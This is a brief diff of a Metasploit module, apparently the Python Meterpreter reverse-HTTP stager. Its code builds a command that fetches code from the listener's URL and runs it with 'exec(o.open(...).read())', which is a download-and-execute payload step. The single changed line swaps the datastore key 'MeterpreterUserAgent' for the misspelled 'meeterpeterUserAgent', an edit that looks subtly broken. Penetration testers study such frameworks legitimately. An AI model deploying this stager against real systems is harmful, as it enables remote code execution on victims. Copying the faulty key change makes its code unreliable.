@@ -82,7 +82,7 @@ module Metasploit3
     end
 
     cmd << "o=ul.build_opener(*hs)\n"
-    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
+    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['meeterpeterUserAgent'])}')]\n"
     cmd << "exec(o.open('#{target_url}').read())\n"
 
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
